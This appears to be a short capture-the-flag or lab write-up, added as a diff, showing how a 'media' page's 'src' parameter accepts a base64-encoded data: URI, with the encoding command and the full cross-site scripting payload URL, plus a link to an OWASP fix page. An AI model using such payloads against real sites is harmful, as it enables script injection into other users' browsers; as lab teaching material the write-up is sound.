@@ -1,0 +1,15 @@
+By inspecting the source code of the front page we can see that there is a
+<a href="?page=media&src=nsa">
+meaning that the page 'media' accepts 'src' filter to which we can pass our
+script, though not directly, but in an encoded way.
+
+First, encode <script>alert('Yay')</script> or any other script with base64 like so:
+    base64 <<< "<script>alert('Yay')</script>"
+    PHNjcmlwdD5hbGVydCgnWWF5Jyk8L3NjcmlwdD4K
+
+Then, pass it to 'src' filter
+http://<ip_address>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWWF5Jyk8L3NjcmlwdD4K
+
+FIX
+
+https://owasp.org/www-community/attacks/xss/#xss-using-code-encoding
